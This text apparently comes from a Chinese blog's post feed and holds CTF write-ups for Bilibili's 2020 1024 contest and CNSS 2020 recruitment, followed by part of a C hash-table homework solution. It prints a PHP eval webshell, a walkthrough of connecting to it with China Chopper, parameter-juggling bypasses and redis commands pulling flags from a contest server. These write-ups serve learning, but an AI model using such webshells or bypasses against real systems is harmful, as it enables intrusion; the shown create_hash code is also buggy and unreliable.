class="line">[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!</span><br><span class="line"></span><br><span class="line">………（太长啦~</span><br><span class="line"></span><br><span class="line">+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+([]+&#123;&#125;)[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(+!![][]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))</span><br></pre></td></tr></table></figure></div><p>很明显的jsfuck加密方法，最初被黑客用于网页注入~<br>在Chrome浏览器粘贴运行可以直接解码<br>结果为： </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;var str1 &#x3D; &quot;\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9&quot;;</span><br><span class="line">var str2 &#x3D; &quot;bilibili1024havefun&quot;;</span><br><span class="line">console.log()&quot;</span><br></pre></td></tr></table></figure></div><p>str1的内容很容易看出是Unicode字符，经转化得到<strong>程序员最多的地方</strong><br>果断打开最大的<del>同性交友网站</del> Github！搜索bilibili1024havefun找到对应的Repository<br>拿到真·end.php的源码:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;filename end.php</span><br><span class="line"></span><br><span class="line">$bilibili &#x3D; &quot;bilibili1024havefun&quot;;</span><br><span class="line"></span><br><span class="line">$str &#x3D; intval($_GET[&#39;id&#39;]);</span><br><span class="line">$reg &#x3D; preg_match(&#39;&#x2F;\d&#x2F;is&#39;, $_GET[&#39;id&#39;]);</span><br><span class="line"></span><br><span class="line">if(!is_numeric($_GET[&#39;id&#39;]) and $reg !&#x3D;&#x3D; 1 and $str &#x3D;&#x3D;&#x3D; 1)&#123;</span><br><span class="line">$content &#x3D; file_get_contents($_GET[&#39;url&#39;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;文件路径猜解</span><br><span class="line">if (false)&#123;</span><br><span class="line">echo &quot;还差一点点啦～&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;你想要的不在这儿～&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>传参id[]=1满足第一个条件，按照前面题目的格式api/ctf/x，不难猜出有api/ctf/6/flag.txt<br>考虑到这玩意也不是个flag，又想到图片隐写~于是另存为图片，打开就是flag啦<br>于是得到了Flag10:<code>2ebd3b08-47ffc478-b49a5f9d-f6099d65</code>（？？《关于我做第六题却得到了第十题Flag的事》</p><h1 id="Question-ID-7-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-7-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_7 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_7 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-6"><a href="#解析-6" class="headerlink" title="解析"></a>解析</h2><p>404</p><h1 id="Question-ID-8-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-8-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_8 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_8 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-7"><a href="#解析-7" class="headerlink" title="解析"></a>解析</h2><p>在NodeJS框架下解<br>需要库：redis<br>阶梯代码如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var redis &#x3D; require(&#39;redis&#39;),</span><br><span class="line">  RDS_PORT &#x3D; 6379,</span><br><span class="line">  RDS_HOST &#x3D; &#39;120.92.151.189&#39;,</span><br><span class="line">  RDS_OPTS &#x3D; &#123;&#125;,</span><br><span class="line">  client &#x3D; redis.createClient(RDS_PORT, RDS_HOST, RDS_OPTS);</span><br><span class="line"></span><br><span class="line">client.on(&#39;connect&#39;, function () &#123;</span><br><span class="line">  client.hgetall(&quot;flag8&quot;, (e, r) &#x3D;&gt; &#123;</span><br><span class="line">    console.dir(r);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>喜闻乐见的是，全国的带佬们都在用扫描，不排除还有爆破从而达成人肉DDOS的hhh<br>总而言之，服务器在挂的边缘疯狂试探，我愿称之为服务器的挂&amp;不挂二象性<br>多试几次~</p><p>返回结果：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag1&quot;</span><br><span class="line">&quot;3b96173a-b3df4cdd-22d4c15f-261e7309&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag2&quot;</span><br><span class="line">&quot;bd871042-1e09a130-3ddd4faa-cebdb048&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag3&quot;</span><br><span class="line">&quot;c7f7a7c2-28b7f895-5432152b-6410e042&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag4&quot;</span><br><span class="line">&quot;d338e3c8-93215105-258d79ba-b364e59c&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag5&quot;</span><br><span class="line">&quot;612d1886-044898af-6c1e9dba-b58ad075&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag6&quot;</span><br><span class="line">&quot;8aa6f15d-65e37c9b-78c2bc37-00ed5aee&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag7&quot;</span><br><span class="line">&quot;b78ce2aa-10d03327-f2035f4e-55c17689&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag8&quot;</span><br><span class="line">&quot;d436b982-2b81aa54-49a8d2db-87ab951a&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag9&quot;</span><br><span class="line">&quot;b3238659-b81512e6-3a307c74-9877ecc5&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag10&quot;</span><br><span class="line">&quot;e5653416-595b3d0c-4c2a57ee-c026350e&quot;</span><br></pre></td></tr></table></figure></div><p>我们得到了Flag8:<code>d436b982-2b81aa54-49a8d2db-87ab951a</code></p><h1 id="Question-ID-9-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-9-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_9 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_9 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-8"><a href="#解析-8" class="headerlink" title="解析"></a>解析</h2><p>404</p><h1 id="Question-ID-10-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-10-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_10 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_10 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-9"><a href="#解析-9" class="headerlink" title="解析"></a>解析</h2><p>404</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>6、7、9题截止目前还没有解出来<br>（史称679事件 <del>我还是太菜了啊TAT</del><br>总之Bilibili_2020_10_24_CTF的题目就做到这里了，虽然都是Web方向的题，但是还是存在着很多运气的成分<del>Administrator</del> /笑<br>对新手还是蛮友好的，前5题还是可以学到很多东西，特别是Web题里面的一些基础知识~</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bilibili </tag>
            
            <tag> PHP </tag>
            
            <tag> ctf </tag>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 1024 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNSS2020_招新解析</title>
      <link href="/post/b5f19194.html"/>
      <url>/post/b5f19194.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>施工中！！！Coming Soon！！！</strong></p><h1 id="Web方向"><a href="#Web方向" class="headerlink" title="Web方向"></a>Web方向</h1><h2 id="Web-01-baby-Web-方向做题须知"><a href="#Web-01-baby-Web-方向做题须知" class="headerlink" title="Web_01_(baby)Web 方向做题须知"></a>Web_01_(baby)Web 方向做题须知</h2><h3 id="Web-方向做题须知"><a href="#Web-方向做题须知" class="headerlink" title="Web 方向做题须知"></a>Web 方向做题须知</h3><p>1.Web题目为每道题目描述里给出的链接地址所指向的web应用(所以不要在平台题目描述界面寻找flag了<br>2.flag格式统一为cnss{} 花括号中间为有意义的字符串，通常会以_区分单个单词<br>3.hint意为提示 是出题人给出的解题提示 并不要求你在flag提交处作答(x<br>4.当你成功得到flag时 flag一定是以cnss{}的形式显示的 所以不需要自己手动添加cnss{}(如果有那你找到的一定不是flag</p><h4 id="做题要求"><a href="#做题要求" class="headerlink" title="做题要求"></a>做题要求</h4><blockquote><p>要会看HTML源码<br>能读懂简单的PHP代码<br>懂一点点HTTP报文<br>学会使用burpsuite的repeater模块</p></blockquote><h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4><blockquote><p>burpsuite<br>metasploit<br>AntSword<br>f12开发者工具 插件如hackbar等<br>ps:浏览器请使用 firefox/chrome</p></blockquote><h4 id="学习参考"><a href="#学习参考" class="headerlink" title="学习参考"></a>学习参考</h4><blockquote><p>学会使用搜索引擎搜索关键字以找到自己需要的学习资料<br>从别人的博客文章/官方文档中学习<br>书籍和视频中学到的大多是系统全面的知识，但是相应的效率便低了<br>针对性学习和系统性学习，需要每个人结合自身情况进行均衡</p></blockquote><p><code>cnss{flag_is_just_like_this}</code></p><h2 id="Web-02-baby-卖菜刀"><a href="#Web-02-baby-卖菜刀" class="headerlink" title="Web_02_(baby)卖菜刀"></a>Web_02_(baby)卖菜刀</h2><blockquote><p>卖菜刀，卖菜刀，3 元 1 把，10 元 3 把。<br>快让 X5tar 看看你的菜刀锋利不锋利！</p></blockquote><p><a href="http://recruit.x5tar.com:60003/" target="_blank" rel="noopener">http://recruit.x5tar.com:60003/</a></p><p><strong>PS：被某些杀软报毒属于正常现象，可以放心做题，本题不会对你的电脑产生任何不利影响</strong></p><p><em>hint1：PHP 一句话木马</em><br><em>hint2：也许黑色蒙蔽了你的双眼（</em></p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>F12审查元素之后，发现网页源码中有这样一句<br><code>?php @eval($_POST[&#39;x5tar&#39;]);</code><br>显然是一个标准格式的一句话木马，而且出题人已经将连接的密码给出来了，即‘’中的内容x5tar<br>于是直接用菜刀连接，笔者采用的是2011版本的中国菜刀<br>链接填写<em><a href="http://recruit.x5tar.com:60003/" target="_blank" rel="noopener">http://recruit.x5tar.com:60003/</a></em>,脚本类型选择PHP，编码标准不做改动，单击“连接”<br>成功连接之后，即可取得控制权限，在网页源码文件夹下找到一名为flag的文件，打开<br>发现 <code>cnss{The_fl4g_1n_/_is_fak3}</code> 出题人居然留了一手，好气！<br>依据提示，我们返回根目录下，发现真正的flag文件，打开为 <code>cnss{y0ur_ca1da0_1s_aw3s0m3}</code><br>Binggo！我们终于得到了正确的flag!</p><h2 id="Web-03-baby-更简单的计算题"><a href="#Web-03-baby-更简单的计算题" class="headerlink" title="Web_03_(baby)更简单的计算题"></a>Web_03_(baby)更简单的计算题</h2><p>有人说夏令营的计算题太难，怎么可能在一秒内算出🌶么大的数<br>所以招新出了一个更加简单的计算题<br>但是让你算出答案又能怎样<br><strong>你真的可以提交吗？</strong></p><p><a href="http://recruit.x5tar.com:60002/" target="_blank" rel="noopener">http://recruit.x5tar.com:60002/</a></p><p><em>hint1：HTML 属性</em><br><em>hint2：试试 F12？</em></p><h3 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h3><p>惯例，先观察页面。发现是一个8位数的加法，但是输入框只能填写5位数字！<br>F12检察元素，发现这样一行<br><code>input type=&quot;text&quot; name=&quot;re&quot; maxlength=&quot;5&quot;</code><br>显然，它限制了我们提交答案的位数，直接更改之<br>但是发现，我们更改完成之后，“提交”的选项卡直接灰了，我们再回去看审查元素<br><code>input type=&quot;submit&quot; value=&quot;提交&quot; disabled=&quot;&quot;</code><br>这样一行禁止了我们使用提交按钮。于是将其状态改为abled即可<br>提交正确的计算结果后我们直接在页面上得到返回的flag<br><code>恭喜你，计算正确🎉cnss{no_one_kno3s_htm1_b3tt3r_than_u}</code></p><h2 id="Web-04-easy-最好的语言？"><a href="#Web-04-easy-最好的语言？" class="headerlink" title="Web_04_(easy)最好的语言？"></a>Web_04_(easy)最好的语言？</h2><p>你知道最好的语言是什么吗？<br>没错！当然就是超有趣的 PHP 辣！</p><p><a href="http://recruit.x5tar.com:60004/" target="_blank" rel="noopener">http://recruit.x5tar.com:60004/</a></p><p><em>hint1：PHP 反序列化</em><br><em>hint2：CVE-2016-7124</em><br><em>hint3：protected 和 private 属性的序列化</em></p><h3 id="解析-2"><a href="#解析-2" class="headerlink" title="解析"></a>解析</h3><h2 id="施工中！！！Coming-Soon！！！"><a href="#施工中！！！Coming-Soon！！！" class="headerlink" title="施工中！！！Coming Soon！！！"></a><strong>施工中！！！Coming Soon！！！</strong></h2><h1 id="Reverse方向"><a href="#Reverse方向" class="headerlink" title="Reverse方向"></a>Reverse方向</h1><h2 id="Reverse-01-Baby-C-Code"><a href="#Reverse-01-Baby-C-Code" class="headerlink" title="Reverse_01_Baby C Code"></a>Reverse_01_Baby C Code</h2><p>题目要求<br>请运行并分析以下C++语言代码，找到满足条件的 flag</p><p>前置知识<br>1.流程控制<br>2.位运算</p><blockquote><p>#include <cstdio><br>#include <cstring><br>char flag[31];<br>char code[]={x8<br>0x9c,0x91,0x8c,0x8c,0x84,0x88,0xcc,0x93,0x9c,0xcf,<br>0x92,0x9a,0xa0,0xc8,0x90,0xa0,0x8d,0xcc,0x89,0xcc,<br>0x8d,0xca,0x9a,0xa0,0x88,0xcf,0x8d,0xce,0x9b,0x82};<br>int main()<br>{<br>    scanf(“%30s”,flag);<br>    if (strlen(flag)!=30) return 0;<br>    for (int i=0;i&lt;30;i++) if (~flag[i]!=code[i]) return 0;<br>    printf(“Congratulation.”);<br>    return 0;<br>}</cstring></cstdio></p></blockquote><h3 id="解析-3"><a href="#解析-3" class="headerlink" title="解析"></a>解析</h3><p>简单的查看一下代码，发现验证逻辑非常简单<br>总体而言就是一种很常见的凯撒密码的变体，其中位移量i的取值范围从0到30<br>结合CNSS做题须知里面的flag格式，再观察到code数组之中第3,4位相同，我们不难推出：<br>0x8c对应的时flag中的‘s’ 由于0x8c对应DEC的140，而‘s’的ASCII码值为115，满足i取值范围<br>因此我们编写解码程序，确定偏移量为-25，之后以字符形式输出即可<br>得到flag——<code>cnss{w3lc0me_7o_r3v3r5e_w0r1d}</code></p><p>Hello World！</p><p>输出 “Hi, CNSS!” 获得 flag</p><p>源码中不允许包含井号，即源码中不允许出现#</p><p>本题编译参数为/usr/bin/g++ -O2 -w -fmax-errors=3 -std=c++14 -lm</p><p>小小的增加了难度</p><p>Hello 5， 它又回来了！</p><p>CNSS招新传统题目！</p><p>输出 “Hi, CNSS!” 获得flag</p><p>源码中不允许包含 %:?#({&lt;[]&gt;})</p><p>通过后请带着 submit id 联系我</p><p>点我获得flag</p><p>PS. 不要去爆栈网或者知乎提问</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CNSS </tag>
            
            <tag> CTF </tag>
            
            <tag> flag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第七次作业解析-查找</title>
      <link href="/post/420a3e9e.html"/>
      <url>/post/420a3e9e.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><p>哈希表创建<br>哈希表（Hash Table，也叫散列表），是根据键（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。这个映射函数称做哈希函数，存放记录的数组称做哈希表。哈希表相关定义如下：</p><blockquote><p>typedef enum{<br>    HASH_OK,<br>    HASH_ERROR,<br>    HASH_ADDED,<br>    HASH_REPLACED_VALUE,<br>   HASH_ALREADY_ADDED,<br>    HASH_DELETED,<br>    HASH_NOT_FOUND,<br>} HASH_RESULT;</p><p>typedef struct __HashEntry HashEntry;<br>struct __HashEntry{<br>    union{<br>        char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>    } key;<br>    union{<br>        char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>        long   long_value;<br>        void  *ptr_value;<br>    } value;<br>    HashEntry *next;<br>};</p><p>struct __HashTable{<br>    HashEntry **bucket;<br>    int size;<br>    HASH_RESULT last_error;<br>};<br>typedef struct __HashTable HashTable;</p><p>// 创建大小为hash_size的哈希表，创建成功后返回HashTable类型的指针，否则返回NULL。<br>HashTable *create_hash(int hash_size);</p><p>当成功插入顶点或边时，函数返回true，否则（如顶点或边已存在、插入边时顶点v或w不存在）返回false。</p></blockquote><p>哈希表相关说明：</p><blockquote><p>HASH_RESULT 类型为相关函数的返回类型<br>HashEntry 为哈希表所保存元素（即键值对 《key, value》）类型<br>HashTable 为哈希表，其中 bucket 指向大小为size的、元素类型为 HashEntry*的指针数组<br>哈希表采用链地址法处理冲突</p></blockquote><p>请实现 create_hash 函数，创建指定大小的哈希表。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-06-22, Mon, 02:08:46</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;hash.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">HashTable* create_hash(int size)</span><br><span class="line">&#123;</span><br><span class="line">    HashTable* H &#x3D; (HashTable*)malloc(sizeof(HashTable));</span><br><span class="line">    H-&gt;bucket &#x3D; (HashEntry**)malloc(sizeof(HashEntry**) * size);</span><br><span class="line">    if (!H-&gt;bucket) &#123;</span><br><span class="line">        free(H);</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    memset(H, 0, sizeof(HashTable));</span><br><span class="line">    H-&gt;size &#x3D; size;</span><br><span class="line">    return H;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><p>哈希表添加</p><p>哈希表（Hash Table，也叫散列表），是根据键（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。这个映射函数称做哈希函数，存放记录的数组称做哈希表。哈希表相关定义如下：</p><blockquote><p>typedef enum{<br>   HASH_OK,<br>   HASH_ERROR,<br>   HASH_ADDED,<br>   HASH_REPLACED_VALUE,<br>   HASH_ALREADY_ADDED,<br>   HASH_DELETED,<br>   HASH_NOT_FOUND,<br>} HASH_RESULT;</p><p>typedef struct __HashEntry HashEntry;<br>struct __HashEntry{<br>    union{<br>        char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>    } key;<br>    union{<br>       char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>        long   long_value;<br>        void  *ptr_value;<br>    } value;<br>    HashEntry *next;<br>};</p><p>struct __HashTable{<br>    HashEntry **bucket;<br>    int size;<br>    HASH_RESULT last_error;<br>};<br>typedef struct __HashTable HashTable;</p><p>// 向哈希表中添加元素，其中键类型为char*， 元素类型为int。<br>HASH_RESULT hash_add_int(HashTable * table, const char * key, int value);</p></blockquote><p>哈希表相关说明：</p><blockquote><p>HASH_RESULT 类型为相关函数的返回类型<br>HashEntry 为哈希表所保存元素（即键值对 《key, value》）类型<br>HashTable 为哈希表，其中 bucket 指向大小为size的、元素类型为 HashEntry*的指针数组<br>哈希表采用链地址法处理冲突</p></blockquote><p>请实现 hash_add_int 函数，向哈希表中添加元素，其中键类型为char*， 元素类型为int。在添加过程中，如果要添加的键值key已在哈希表中，且对应的值value也已存在，则函数返回 HASH_ALREADY_ADDED；如果要添加的键值key已在哈希表中，但对应的值value不同，则函数将value值更新到哈希表中，之后返回 HASH_REPLACED_VALUE；如果要添加的键值key不在哈希表中，则函数创建 HashEntry 类型，并将其加入到哈希表中，且函数返回 HASH_ADDED。本题所用的哈希函数如下：</p><blockquote><p>long hash_string(const char <em>str)<br>{<br>    long hash = 5381;<br>    int c;<br>    while (c = *str++)<br>        hash = ((hash &lt;&lt; 5) + hash) + c; /</em> hash * 33 + c */<br>    if(hash &lt; 0)<br>        hash *= -1;<br>    return hash;<br>}</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：冯新越(2019091602014)</span><br><span class="line"> * 完成时间：2020-06-22, Mon, 02:10:56</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;hash.h&quot;</span><br><span class="line">#include &quot;stdlib.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int Find(HashTable* table, const char* 